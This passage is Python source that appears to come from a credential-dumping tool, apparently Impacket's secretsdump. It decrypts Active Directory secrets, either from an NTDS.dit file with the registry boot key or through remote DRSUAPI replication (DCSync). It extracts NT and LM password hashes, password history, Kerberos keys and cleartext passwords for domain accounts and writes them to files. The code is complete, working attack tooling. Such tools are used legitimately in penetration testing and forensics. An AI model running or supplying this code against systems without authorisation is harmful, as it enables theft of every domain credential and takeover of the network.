         ('Unknown', '<L=0'),
         ('EncryptedHash', '32s=""'))

    class CRYPTED_HISTORY(Structure):
        structure = (
         ('Header', '8s=""'),
         ('KeyMaterial', '16s=""'),
         ('EncryptedHash', ':'))

    class CRYPTED_BLOB(Structure):
        structure = (
         ('Header', '8s=""'),
         ('KeyMaterial', '16s=""'),
         ('EncryptedHash', ':'))

    def __init__(self, ntdsFile, bootKey, isRemote=False, history=False, noLMHash=True, remoteOps=None, useVSSMethod=False, justNTLM=False, pwdLastSet=False, resumeSession=None, outputFileName=None, justUser=None, printUserStatus=False, perSecretCallback=lambda secretType, secret: _print_helper(secret), resumeSessionMgr=ResumeSessionMgrInFile):
        self.__bootKey = bootKey
        self.__NTDS = ntdsFile
        self.__history = history
        self.__noLMHash = noLMHash
        self.__useVSSMethod = useVSSMethod
        self.__remoteOps = remoteOps
        self.__pwdLastSet = pwdLastSet
        self.__printUserStatus = printUserStatus
        if self.__NTDS is not None:
            self.__ESEDB = ESENT_DB(ntdsFile, isRemote=isRemote)
            self.__cursor = self.__ESEDB.openTable('datatable')
        self.__tmpUsers = list()
        self.__PEK = list()
        self.__cryptoCommon = CryptoCommon()
        self.__kerberosKeys = OrderedDict()
        self.__clearTextPwds = OrderedDict()
        self.__justNTLM = justNTLM
        self.__resumeSession = resumeSessionMgr(resumeSession)
        self.__outputFileName = outputFileName
        self.__justUser = justUser
        self.__perSecretCallback = perSecretCallback
        return

    def getResumeSessionFile(self):
        return self.__resumeSession.getFileName()

    def __getPek(self):
        LOG.info('Searching for pekList, be patient')
        peklist = None
        while True:
            try:
                record = self.__ESEDB.getNextRow(self.__cursor)
            except:
                LOG.error('Error while calling getNextRow(), trying the next one')
                continue

            if record is None:
                break
            elif record[self.NAME_TO_INTERNAL['pekList']] is not None:
                peklist = unhexlify(record[self.NAME_TO_INTERNAL['pekList']])
                break
            elif record[self.NAME_TO_INTERNAL['sAMAccountType']] in self.ACCOUNT_TYPES:
                self.__tmpUsers.append(record)

        if peklist is not None:
            encryptedPekList = self.PEKLIST_ENC(peklist)
            if encryptedPekList['Header'][:4] == '\x02\x00\x00\x00':
                md5 = hashlib.new('md5')
                md5.update(self.__bootKey)
                for i in range(1000):
                    md5.update(encryptedPekList['KeyMaterial'])

                tmpKey = md5.digest()
                rc4 = ARC4.new(tmpKey)
                decryptedPekList = self.PEKLIST_PLAIN(rc4.encrypt(encryptedPekList['EncryptedPek']))
                PEKLen = len(self.PEK_KEY())
                for i in range(len(decryptedPekList['DecryptedPek']) / PEKLen):
                    cursor = i * PEKLen
                    pek = self.PEK_KEY(decryptedPekList['DecryptedPek'][cursor:cursor + PEKLen])
                    LOG.info('PEK # %d found and decrypted: %s', i, hexlify(pek['Key']))
                    self.__PEK.append(pek['Key'])

            elif encryptedPekList['Header'][:4] == '\x03\x00\x00\x00':
                decryptedPekList = self.PEKLIST_PLAIN(self.__cryptoCommon.decryptAES(self.__bootKey, encryptedPekList['EncryptedPek'], encryptedPekList['KeyMaterial']))
                self.__PEK.append(decryptedPekList['DecryptedPek'][4:][:16])
                LOG.info('PEK # 0 found and decrypted: %s', hexlify(decryptedPekList['DecryptedPek'][4:][:16]))
        return

    def __removeRC4Layer(self, cryptedHash):
        md5 = hashlib.new('md5')
        pekIndex = hexlify(cryptedHash['Header'])
        md5.update(self.__PEK[int(pekIndex[8:10])])
        md5.update(cryptedHash['KeyMaterial'])
        tmpKey = md5.digest()
        rc4 = ARC4.new(tmpKey)
        plainText = rc4.encrypt(cryptedHash['EncryptedHash'])
        return plainText

    def __removeDESLayer(self, cryptedHash, rid):
        Key1, Key2 = self.__cryptoCommon.deriveKey(int(rid))
        Crypt1 = DES.new(Key1, DES.MODE_ECB)
        Crypt2 = DES.new(Key2, DES.MODE_ECB)
        decryptedHash = Crypt1.decrypt(cryptedHash[:8]) + Crypt2.decrypt(cryptedHash[8:])
        return decryptedHash

    @staticmethod
    def __fileTimeToDateTime(t):
        t -= 116444736000000000
        t /= 10000000
        if t < 0:
            return 'never'
        else:
            dt = datetime.fromtimestamp(t)
            return dt.strftime('%Y-%m-%d %H:%M')

    def __decryptSupplementalInfo(self, record, prefixTable=None, keysFile=None, clearTextFile=None):
        haveInfo = False
        LOG.debug('Entering NTDSHashes.__decryptSupplementalInfo')
        if self.__useVSSMethod is True:
            if record[self.NAME_TO_INTERNAL['supplementalCredentials']] is not None:
                if len(unhexlify(record[self.NAME_TO_INTERNAL['supplementalCredentials']])) > 24:
                    if record[self.NAME_TO_INTERNAL['userPrincipalName']] is not None:
                        domain = record[self.NAME_TO_INTERNAL['userPrincipalName']].split('@')[(-1)]
                        userName = '%s\\%s' % (domain, record[self.NAME_TO_INTERNAL['sAMAccountName']])
                    else:
                        userName = '%s' % record[self.NAME_TO_INTERNAL['sAMAccountName']]
                    cipherText = self.CRYPTED_BLOB(unhexlify(record[self.NAME_TO_INTERNAL['supplementalCredentials']]))
                    if cipherText['Header'][:4] == '\x13\x00\x00\x00':
                        pekIndex = hexlify(cipherText['Header'])
                        plainText = self.__cryptoCommon.decryptAES(self.__PEK[int(pekIndex[8:10])], cipherText['EncryptedHash'][4:], cipherText['KeyMaterial'])
                        haveInfo = True
                    else:
                        plainText = self.__removeRC4Layer(cipherText)
                        haveInfo = True
        else:
            domain = None
            userName = None
            replyVersion = 'V%d' % record['pdwOutVersion']
            for attr in record['pmsgOut'][replyVersion]['pObjects']['Entinf']['AttrBlock']['pAttr']:
                try:
                    attId = drsuapi.OidFromAttid(prefixTable, attr['attrTyp'])
                    LOOKUP_TABLE = self.ATTRTYP_TO_ATTID
                except Exception as e:
                    LOG.debug('Failed to execute OidFromAttid with error %s' % e)
                    attId = attr['attrTyp']
                    LOOKUP_TABLE = self.NAME_TO_ATTRTYP

                if attId == LOOKUP_TABLE['userPrincipalName']:
                    if attr['AttrVal']['valCount'] > 0:
                        try:
                            domain = ('').join(attr['AttrVal']['pAVal'][0]['pVal']).decode('utf-16le').split('@')[(-1)]
                        except:
                            domain = None

                    else:
                        domain = None
                elif attId == LOOKUP_TABLE['sAMAccountName']:
                    if attr['AttrVal']['valCount'] > 0:
                        try:
                            userName = ('').join(attr['AttrVal']['pAVal'][0]['pVal']).decode('utf-16le')
                        except:
                            LOG.error('Cannot get sAMAccountName for %s' % record['pmsgOut'][replyVersion]['pNC']['StringName'][:-1])
                            userName = 'unknown'

                    else:
                        LOG.error('Cannot get sAMAccountName for %s' % record['pmsgOut'][replyVersion]['pNC']['StringName'][:-1])
                        userName = 'unknown'
                if attId == LOOKUP_TABLE['supplementalCredentials']:
                    if attr['AttrVal']['valCount'] > 0:
                        blob = ('').join(attr['AttrVal']['pAVal'][0]['pVal'])
                        plainText = drsuapi.DecryptAttributeValue(self.__remoteOps.getDrsr(), blob)
                        if len(plainText) > 24:
                            haveInfo = True

        if domain is not None:
            userName = '%s\\%s' % (domain, userName)
        if haveInfo is True:
            try:
                userProperties = samr.USER_PROPERTIES(plainText)
            except:
                return

            propertiesData = userProperties['UserProperties']
            for propertyCount in range(userProperties['PropertyCount']):
                userProperty = samr.USER_PROPERTY(propertiesData)
                propertiesData = propertiesData[len(userProperty):]
                if userProperty['PropertyName'].decode('utf-16le') == 'Primary:Kerberos-Newer-Keys':
                    propertyValueBuffer = unhexlify(userProperty['PropertyValue'])
                    kerbStoredCredentialNew = samr.KERB_STORED_CREDENTIAL_NEW(propertyValueBuffer)
                    data = kerbStoredCredentialNew['Buffer']
                    for credential in range(kerbStoredCredentialNew['CredentialCount']):
                        keyDataNew = samr.KERB_KEY_DATA_NEW(data)
                        data = data[len(keyDataNew):]
                        keyValue = propertyValueBuffer[keyDataNew['KeyOffset']:][:keyDataNew['KeyLength']]
                        if self.KERBEROS_TYPE.has_key(keyDataNew['KeyType']):
                            answer = '%s:%s:%s' % (userName, self.KERBEROS_TYPE[keyDataNew['KeyType']], hexlify(keyValue))
                        else:
                            answer = '%s:%s:%s' % (userName, hex(keyDataNew['KeyType']), hexlify(keyValue))
                        self.__kerberosKeys[answer] = None
                        if keysFile is not None:
                            self.__writeOutput(keysFile, answer + '\n')

                elif userProperty['PropertyName'].decode('utf-16le') == 'Primary:CLEARTEXT':
                    try:
                        answer = '%s:CLEARTEXT:%s' % (userName, unhexlify(userProperty['PropertyValue']).decode('utf-16le'))
                    except UnicodeDecodeError:
                        answer = '%s:CLEARTEXT:0x%s' % (userName, userProperty['PropertyValue'])

                    self.__clearTextPwds[answer] = None
                    if clearTextFile is not None:
                        self.__writeOutput(clearTextFile, answer + '\n')

            if clearTextFile is not None:
                clearTextFile.flush()
            if keysFile is not None:
                keysFile.flush()
        LOG.debug('Leaving NTDSHashes.__decryptSupplementalInfo')
        return

    def __decryptHash(self, record, prefixTable=None, outputFile=None):
        LOG.debug('Entering NTDSHashes.__decryptHash')
        if self.__useVSSMethod is True:
            LOG.debug('Decrypting hash for user: %s' % record[self.NAME_TO_INTERNAL['name']])
            sid = SAMR_RPC_SID(unhexlify(record[self.NAME_TO_INTERNAL['objectSid']]))
            rid = sid.formatCanonical().split('-')[(-1)]
            if record[self.NAME_TO_INTERNAL['dBCSPwd']] is not None:
                encryptedLMHash = self.CRYPTED_HASH(unhexlify(record[self.NAME_TO_INTERNAL['dBCSPwd']]))
                tmpLMHash = self.__removeRC4Layer(encryptedLMHash)
                LMHash = self.__removeDESLayer(tmpLMHash, rid)
            else:
                LMHash = ntlm.LMOWFv1('', '')
            if record[self.NAME_TO_INTERNAL['unicodePwd']] is not None:
                encryptedNTHash = self.CRYPTED_HASH(unhexlify(record[self.NAME_TO_INTERNAL['unicodePwd']]))
                if encryptedNTHash['Header'][:4] == '\x13\x00\x00\x00':
                    encryptedNTHash = self.CRYPTED_HASHW16(unhexlify(record[self.NAME_TO_INTERNAL['unicodePwd']]))
                    pekIndex = hexlify(encryptedNTHash['Header'])
                    tmpNTHash = self.__cryptoCommon.decryptAES(self.__PEK[int(pekIndex[8:10])], encryptedNTHash['EncryptedHash'][:16], encryptedNTHash['KeyMaterial'])
                else:
                    tmpNTHash = self.__removeRC4Layer(encryptedNTHash)
                NTHash = self.__removeDESLayer(tmpNTHash, rid)
            else:
                NTHash = ntlm.NTOWFv1('', '')
            if record[self.NAME_TO_INTERNAL['userPrincipalName']] is not None:
                domain = record[self.NAME_TO_INTERNAL['userPrincipalName']].split('@')[(-1)]
                userName = '%s\\%s' % (domain, record[self.NAME_TO_INTERNAL['sAMAccountName']])
            else:
                userName = '%s' % record[self.NAME_TO_INTERNAL['sAMAccountName']]
            if self.__printUserStatus is True:
                if record[self.NAME_TO_INTERNAL['userAccountControl']] is not None:
                    if ('{0:08b}').format(record[self.NAME_TO_INTERNAL['userAccountControl']])[-2:-1] == '1':
                        userAccountStatus = 'Disabled'
                    elif ('{0:08b}').format(record[self.NAME_TO_INTERNAL['userAccountControl']])[-2:-1] == '0':
                        userAccountStatus = 'Enabled'
                else:
                    userAccountStatus = 'N/A'
            if record[self.NAME_TO_INTERNAL['pwdLastSet']] is not None:
                pwdLastSet = self.__fileTimeToDateTime(record[self.NAME_TO_INTERNAL['pwdLastSet']])
            else:
                pwdLastSet = 'N/A'
            answer = '%s:%s:%s:%s:::' % (userName, rid, hexlify(LMHash), hexlify(NTHash))
            if self.__pwdLastSet is True:
                answer = '%s (pwdLastSet=%s)' % (answer, pwdLastSet)
            if self.__printUserStatus is True:
                answer = '%s (status=%s)' % (answer, userAccountStatus)
            self.__perSecretCallback(NTDSHashes.SECRET_TYPE.NTDS, answer)
            if outputFile is not None:
                self.__writeOutput(outputFile, answer + '\n')
            if self.__history:
                LMHistory = []
                NTHistory = []
                if record[self.NAME_TO_INTERNAL['lmPwdHistory']] is not None:
                    encryptedLMHistory = self.CRYPTED_HISTORY(unhexlify(record[self.NAME_TO_INTERNAL['lmPwdHistory']]))
                    tmpLMHistory = self.__removeRC4Layer(encryptedLMHistory)
                    for i in range(0, len(tmpLMHistory) / 16):
                        LMHash = self.__removeDESLayer(tmpLMHistory[i * 16:(i + 1) * 16], rid)
                        LMHistory.append(LMHash)

                if record[self.NAME_TO_INTERNAL['ntPwdHistory']] is not None:
                    encryptedNTHistory = self.CRYPTED_HISTORY(unhexlify(record[self.NAME_TO_INTERNAL['ntPwdHistory']]))
                    if encryptedNTHistory['Header'][:4] == '\x13\x00\x00\x00':
                        pekIndex = hexlify(encryptedNTHistory['Header'])
                        tmpNTHistory = self.__cryptoCommon.decryptAES(self.__PEK[int(pekIndex[8:10])], encryptedNTHistory['EncryptedHash'], encryptedNTHistory['KeyMaterial'])
                    else:
                        tmpNTHistory = self.__removeRC4Layer(encryptedNTHistory)
                    for i in range(0, len(tmpNTHistory) / 16):
                        NTHash = self.__removeDESLayer(tmpNTHistory[i * 16:(i + 1) * 16], rid)
                        NTHistory.append(NTHash)

                for i, (LMHash, NTHash) in enumerate(map(lambda l, n: (l, n) if l else ('', n), LMHistory[1:], NTHistory[1:])):
                    if self.__noLMHash:
                        lmhash = hexlify(ntlm.LMOWFv1('', ''))
                    else:
                        lmhash = hexlify(LMHash)
                    answer = '%s_history%d:%s:%s:%s:::' % (userName, i, rid, lmhash, hexlify(NTHash))
                    if outputFile is not None:
                        self.__writeOutput(outputFile, answer + '\n')
                    self.__perSecretCallback(NTDSHashes.SECRET_TYPE.NTDS, answer)

        else:
            replyVersion = 'V%d' % record['pdwOutVersion']
            LOG.debug('Decrypting hash for user: %s' % record['pmsgOut'][replyVersion]['pNC']['StringName'][:-1])
            domain = None
            if self.__history:
                LMHistory = []
                NTHistory = []
            rid = unpack('<L', record['pmsgOut'][replyVersion]['pObjects']['Entinf']['pName']['Sid'][-4:])[0]
            for attr in record['pmsgOut'][replyVersion]['pObjects']['Entinf']['AttrBlock']['pAttr']:
                try:
                    attId = drsuapi.OidFromAttid(prefixTable, attr['attrTyp'])
                    LOOKUP_TABLE = self.ATTRTYP_TO_ATTID
                except Exception as e:
                    LOG.debug('Failed to execute OidFromAttid with error %s, fallbacking to fixed table' % e)
                    attId = attr['attrTyp']
                    LOOKUP_TABLE = self.NAME_TO_ATTRTYP

                if attId == LOOKUP_TABLE['dBCSPwd']:
                    if attr['AttrVal']['valCount'] > 0:
                        encrypteddBCSPwd = ('').join(attr['AttrVal']['pAVal'][0]['pVal'])
                        encryptedLMHash = drsuapi.DecryptAttributeValue(self.__remoteOps.getDrsr(), encrypteddBCSPwd)
                        LMHash = drsuapi.removeDESLayer(encryptedLMHash, rid)
                    else:
                        LMHash = ntlm.LMOWFv1('', '')
                elif attId == LOOKUP_TABLE['unicodePwd']:
                    if attr['AttrVal']['valCount'] > 0:
                        encryptedUnicodePwd = ('').join(attr['AttrVal']['pAVal'][0]['pVal'])
                        encryptedNTHash = drsuapi.DecryptAttributeValue(self.__remoteOps.getDrsr(), encryptedUnicodePwd)
                        NTHash = drsuapi.removeDESLayer(encryptedNTHash, rid)
                    else:
                        NTHash = ntlm.NTOWFv1('', '')
                elif attId == LOOKUP_TABLE['userPrincipalName']:
                    if attr['AttrVal']['valCount'] > 0:
                        try:
                            domain = ('').join(attr['AttrVal']['pAVal'][0]['pVal']).decode('utf-16le').split('@')[(-1)]
                        except:
                            domain = None

                    else:
                        domain = None
                elif attId == LOOKUP_TABLE['sAMAccountName']:
                    if attr['AttrVal']['valCount'] > 0:
                        try:
                            userName = ('').join(attr['AttrVal']['pAVal'][0]['pVal']).decode('utf-16le')
                        except:
                            LOG.error('Cannot get sAMAccountName for %s' % record['pmsgOut'][replyVersion]['pNC']['StringName'][:-1])
                            userName = 'unknown'

                    else:
                        LOG.error('Cannot get sAMAccountName for %s' % record['pmsgOut'][replyVersion]['pNC']['StringName'][:-1])
                        userName = 'unknown'
                elif attId == LOOKUP_TABLE['objectSid']:
                    if attr['AttrVal']['valCount'] > 0:
                        objectSid = ('').join(attr['AttrVal']['pAVal'][0]['pVal'])
                    else:
                        LOG.error('Cannot get objectSid for %s' % record['pmsgOut'][replyVersion]['pNC']['StringName'][:-1])
                        objectSid = rid
                elif attId == LOOKUP_TABLE['pwdLastSet']:
                    if attr['AttrVal']['valCount'] > 0:
                        try:
                            pwdLastSet = self.__fileTimeToDateTime(unpack('<Q', ('').join(attr['AttrVal']['pAVal'][0]['pVal']))[0])
                        except:
                            LOG.error('Cannot get pwdLastSet for %s' % record['pmsgOut'][replyVersion]['pNC']['StringName'][:-1])
                            pwdLastSet = 'N/A'

                elif self.__printUserStatus and attId == LOOKUP_TABLE['userAccountControl']:
                    if attr['AttrVal']['valCount'] > 0:
                        if unpack('<L', ('').join(attr['AttrVal']['pAVal'][0]['pVal']))[0] & samr.UF_ACCOUNTDISABLE:
                            userAccountStatus = 'Disabled'
                        else:
                            userAccountStatus = 'Enabled'
                    else:
                        userAccountStatus = 'N/A'
                if self.__history:
                    if attId == LOOKUP_TABLE['lmPwdHistory']:
                        if attr['AttrVal']['valCount'] > 0:
                            encryptedLMHistory = ('').join(attr['AttrVal']['pAVal'][0]['pVal'])
                            tmpLMHistory = drsuapi.DecryptAttributeValue(self.__remoteOps.getDrsr(), encryptedLMHistory)
                            for i in range(0, len(tmpLMHistory) / 16):
                                LMHashHistory = drsuapi.removeDESLayer(tmpLMHistory[i * 16:(i + 1) * 16], rid)
                                LMHistory.append(LMHashHistory)

                        else:
                            LOG.debug('No lmPwdHistory for user %s' % record['pmsgOut'][replyVersion]['pNC']['StringName'][:-1])
                    elif attId == LOOKUP_TABLE['ntPwdHistory']:
                        if attr['AttrVal']['valCount'] > 0:
                            encryptedNTHistory = ('').join(attr['AttrVal']['pAVal'][0]['pVal'])
                            tmpNTHistory = drsuapi.DecryptAttributeValue(self.__remoteOps.getDrsr(), encryptedNTHistory)
                            for i in range(0, len(tmpNTHistory) / 16):
                                NTHashHistory = drsuapi.removeDESLayer(tmpNTHistory[i * 16:(i + 1) * 16], rid)
                                NTHistory.append(NTHashHistory)

                        else:
                            LOG.debug('No ntPwdHistory for user %s' % record['pmsgOut'][replyVersion]['pNC']['StringName'][:-1])

        if domain is not None:
            userName = '%s\\%s' % (domain, userName)
        answer = '%s:%s:%s:%s:::' % (userName, rid, hexlify(LMHash), hexlify(NTHash))
        if self.__pwdLastSet is True:
            answer = '%s (pwdLastSet=%s)' % (answer, pwdLastSet)
        if self.__printUserStatus is True:
            answer = '%s (status=%s)' % (answer, userAccountStatus)
        self.__perSecretCallback(NTDSHashes.SECRET_TYPE.NTDS, answer)
        if outputFile is not None:
            self.__writeOutput(outputFile, answer + '\n')
        if self.__history:
            for i, (LMHashHistory, NTHashHistory) in enumerate(map(lambda l, n: (l, n) if l else ('', n), LMHistory[1:], NTHistory[1:])):
                if self.__noLMHash:
                    lmhash = hexlify(ntlm.LMOWFv1('', ''))
                else:
                    lmhash = hexlify(LMHashHistory)
                answer = '%s_history%d:%s:%s:%s:::' % (userName, i, rid, lmhash, hexlify(NTHashHistory))
                self.__perSecretCallback(NTDSHashes.SECRET_TYPE.NTDS, answer)
                if outputFile is not None:
                    self.__writeOutput(outputFile, answer + '\n')

        if outputFile is not None:
            outputFile.flush()
        LOG.debug('Leaving NTDSHashes.__decryptHash')
        return

    def dump(self):
        hashesOutputFile = None
        keysOutputFile = None
        clearTextOutputFile = None
        if self.__useVSSMethod is True:
            if self.__NTDS is None:
                return
        elif self.__NTDS is None:
            try:
                if self.__remoteOps is not None:
                    try:
                        self.__remoteOps.connectSamr(self.__remoteOps.getMachineNameAndDomain()[1])
                    except:
                        if os.getenv('KRB5CCNAME') is not None and self.__justUser is not None:
                            pass
                        else:
                            raise

                else:
                    raise Exception('No remote Operations available')
            except Exception as e:
                LOG.debug('Exiting NTDSHashes.dump() because %s' % e)
                return

        try:
            if self.__outputFileName is not None:
                LOG.debug('Saving output to %s' % self.__outputFileName)
                if self.__resumeSession.hasResumeData():
                    mode = 'a+'
                else:
                    mode = 'w+'
                hashesOutputFile = codecs.open(self.__outputFileName + '.ntds', mode, encoding='utf-8')
                if self.__justNTLM is False:
                    keysOutputFile = codecs.open(self.__outputFileName + '.ntds.kerberos', mode, encoding='utf-8')
                    clearTextOutputFile = codecs.open(self.__outputFileName + '.ntds.cleartext', mode, encoding='utf-8')
            LOG.info('Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)')
            if self.__useVSSMethod:
                self.__getPek()
                if self.__PEK is not None:
                    LOG.info('Reading and decrypting hashes from %s ' % self.__NTDS)
                    for record in self.__tmpUsers:
                        try:
                            self.__decryptHash(record, outputFile=hashesOutputFile)
                            if self.__justNTLM is False:
                                self.__decryptSupplementalInfo(record, None, keysOutputFile, clearTextOutputFile)
                        except Exception as e:
                            if LOG.level == logging.DEBUG:
                                import traceback
                                traceback.print_exc()
                            try:
                                LOG.error('Error while processing row for user %s' % record[self.NAME_TO_INTERNAL['name']])
                                LOG.error(str(e))
                            except:
                                LOG.error('Error while processing row!')
                                LOG.error(str(e))

                    while True:
                        try:
                            record = self.__ESEDB.getNextRow(self.__cursor)
                        except:
                            LOG.error('Error while calling getNextRow(), trying the next one')
                            continue

                        if record is None:
                            break
                        try:
                            if record[self.NAME_TO_INTERNAL['sAMAccountType']] in self.ACCOUNT_TYPES:
                                self.__decryptHash(record, outputFile=hashesOutputFile)
                                if self.__justNTLM is False:
                                    self.__decryptSupplementalInfo(record, None, keysOutputFile, clearTextOutputFile)
                        except Exception as e:
                            if LOG.level == logging.DEBUG:
                                import traceback
                                traceback.print_exc()
                            try:
                                LOG.error('Error while processing row for user %s' % record[self.NAME_TO_INTERNAL['name']])
                                LOG.error(str(e))
                            except:
                                LOG.error('Error while processing row!')
                                LOG.error(str(e))

            else:
                LOG.info('Using the DRSUAPI method to get NTDS.DIT secrets')
                status = STATUS_MORE_ENTRIES
                enumerationContext = 0
                if self.__resumeSession.hasResumeData():
                    resumeSid = self.__resumeSession.getResumeData()
                    LOG.info('Resuming from SID %s, be patient' % resumeSid)
                else:
                    resumeSid = None
                    if self.__justUser is None:
                        self.__resumeSession.beginTransaction()
                if self.__justUser is not None:
                    if self.__justUser.find('\\') >= 0 or self.__justUser.find('/') >= 0:
                        self.__justUser = self.__justUser.replace('/', '\\')
                        formatOffered = drsuapi.DS_NAME_FORMAT.DS_NT4_ACCOUNT_NAME
                    else:
                        formatOffered = drsuapi.DS_NT4_ACCOUNT_NAME_SANS_DOMAIN
                    crackedName = self.__remoteOps.DRSCrackNames(formatOffered, drsuapi.DS_NAME_FORMAT.DS_UNIQUE_ID_NAME, name=self.__justUser)
                    if crackedName['pmsgOut']['V1']['pResult']['cItems'] == 1:
                        if crackedName['pmsgOut']['V1']['pResult']['rItems'][0]['status'] != 0:
                            raise Exception('%s: %s' % system_errors.ERROR_MESSAGES[(8468 + crackedName['pmsgOut']['V1']['pResult']['rItems'][0]['status'])])
                        userRecord = self.__remoteOps.DRSGetNCChanges(crackedName['pmsgOut']['V1']['pResult']['rItems'][0]['pName'][:-1])
                        replyVersion = 'V%d' % userRecord['pdwOutVersion']
                        if userRecord['pmsgOut'][replyVersion]['cNumObjects'] == 0:
                            raise Exception("DRSGetNCChanges didn't return any object!")
                    else:
                        LOG.warning('DRSCrackNames returned %d items for user %s, skipping' % (
                         crackedName['pmsgOut']['V1']['pResult']['cItems'], self.__justUser))
                    try:
                        self.__decryptHash(userRecord, userRecord['pmsgOut'][replyVersion]['PrefixTableSrc']['pPrefixEntry'], hashesOutputFile)
                        if self.__justNTLM is False:
                            self.__decryptSupplementalInfo(userRecord, userRecord['pmsgOut'][replyVersion]['PrefixTableSrc']['pPrefixEntry'], keysOutputFile, clearTextOutputFile)
                    except Exception as e:
                        LOG.error('Error while processing user!')
                        LOG.error(str(e))

                else:
                    while status == STATUS_MORE_ENTRIES:
                        resp = self.__remoteOps.getDomainUsers(enumerationContext)
                        for user in resp['Buffer']['Buffer']:
                            userName = user['Name']
                            userSid = self.__remoteOps.ridToSid(user['RelativeId'])
                            if resumeSid is not None:
                                if resumeSid == userSid.formatCanonical():
                                    LOG.debug('resumeSid %s reached! processing users from now on' % userSid.formatCanonical())
                                    resumeSid = None
                                else:
                                    LOG.debug('Skipping SID %s since it was processed already' % userSid.formatCanonical())
                                continue
                            crackedName = self.__remoteOps.DRSCrackNames(drsuapi.DS_NAME_FORMAT.DS_SID_OR_SID_HISTORY_NAME, drsuapi.DS_NAME_FORMAT.DS_UNIQUE_ID_NAME, name=userSid.formatCanonical())
                            if crackedName['pmsgOut']['V1']['pResult']['cItems'] == 1:
                                if crackedName['pmsgOut']['V1']['pResult']['rItems'][0]['status'] != 0:
                                    LOG.error('%s: %s' % system_errors.ERROR_MESSAGES[(8468 + crackedName['pmsgOut']['V1']['pResult']['rItems'][0]['status'])])
                                    break
                                userRecord = self.__remoteOps.DRSGetNCChanges(crackedName['pmsgOut']['V1']['pResult']['rItems'][0]['pName'][:-1])
                                replyVersion = 'V%d' % userRecord['pdwOutVersion']
                                if userRecord['pmsgOut'][replyVersion]['cNumObjects'] == 0:
                                    raise Exception("DRSGetNCChanges didn't return any object!")
                            else:
                                LOG.warning('DRSCrackNames returned %d items for user %s, skipping' % (
                                 crackedName['pmsgOut']['V1']['pResult']['cItems'], userName))
                            try:
                                self.__decryptHash(userRecord, userRecord['pmsgOut'][replyVersion]['PrefixTableSrc']['pPrefixEntry'], hashesOutputFile)
                                if self.__justNTLM is False:
                                    self.__decryptSupplementalInfo(userRecord, userRecord['pmsgOut'][replyVersion]['PrefixTableSrc']['pPrefixEntry'], keysOutputFile, clearTextOutputFile)
                            except Exception as e:
                                if LOG.level == logging.DEBUG:
                                    import traceback
                                    traceback.print_exc()
                                LOG.error('Error while processing user!')
                                LOG.error(str(e))

                            self.__resumeSession.writeResumeData(userSid.formatCanonical())

                        enumerationContext = resp['EnumerationContext']
                        status = resp['ErrorCode']

            if self.__justUser is None:
                self.__resumeSession.clearResumeData()
            LOG.debug("Finished processing and printing user's hashes, now printing supplemental information")
            if len(self.__kerberosKeys) > 0:
                if self.__useVSSMethod is True:
                    LOG.info('Kerberos keys from %s ' % self.__NTDS)
                else:
                    LOG.info('Kerberos keys grabbed')
                for itemKey in self.__kerberosKeys.keys():
                    self.__perSecretCallback(NTDSHashes.SECRET_TYPE.NTDS_KERBEROS, itemKey)

            if len(self.__clearTextPwds) > 0:
                if self.__useVSSMethod is True:
                    LOG.info('ClearText password from %s ' % self.__NTDS)
                else:
                    LOG.info('ClearText passwords grabbed')
                for itemKey in self.__clearTextPwds.keys():
                    self.__perSecretCallback(NTDSHashes.SECRET_TYPE.NTDS_CLEARTEXT, itemKey)

        finally:
            if hashesOutputFile is not None:
                hashesOutputFile.close()
            if keysOutputFile is not None:
                keysOutputFile.close()
            if clearTextOutputFile is not None:
                clearTextOutputFile.close()
            self.__resumeSession.endTransaction()

        return

    @classmethod
    def __writeOutput(cls, fd, data):
        try:
            fd.write(data)
        except Exception as e:
            LOG.error('Error writing entry, skipping (%s)' % str(e))

    def finish(self):
        if self.__NTDS is not None:
            self.__ESEDB.close()
        return


class LocalOperations():

    def __init__(self, systemHive):
        self.__systemHive = systemHive

    def getBootKey(self):
        bootKey = ''
        tmpKey = ''
        winreg = winregistry.Registry(self.__systemHive, False)
        currentControlSet = winreg.getValue('\\Select\\Current')[1]
        currentControlSet = 'ControlSet%03d' % currentControlSet
        for key in ['JD', 'Skew1', 'GBG', 'Data']:
            LOG.debug('Retrieving class info for %s' % key)
            ans = winreg.getClass('\\%s\\Control\\Lsa\\%s' % (currentControlSet, key))
            digit = ans[:16].decode('utf-16le')
            tmpKey = tmpKey + digit

        transforms = [8, 5, 4, 2, 11, 9, 13, 3, 0, 6, 1, 12, 14, 10, 15, 7]
        tmpKey = unhexlify(tmpKey)
        for i in xrange(len(tmpKey)):
            bootKey += tmpKey[transforms[i]]

        LOG.info('Target system bootKey: 0x%s' % hexlify(bootKey))
        return bootKey

    def checkNoLMHashPolicy(self):
        LOG.debug('Checking NoLMHash Policy')
        winreg = winregistry.Registry(self.__systemHive, False)
        currentControlSet = winreg.getValue('\\Select\\Current')[1]
        currentControlSet = 'ControlSet%03d' % currentControlSet
        noLmHash = winreg.getValue('\\%s\\Control\\Lsa\\NoLmHash' % currentControlSet)
        if noLmHash is not None:
            noLmHash = noLmHash[1]
        else:
            noLmHash = 0
        if noLmHash != 1:
            LOG.debug('LMHashes are being stored')
            return False
        else:
            LOG.debug('LMHashes are NOT being stored')
            return True


def _print_helper(*args, **kwargs):
    print args[(-1)]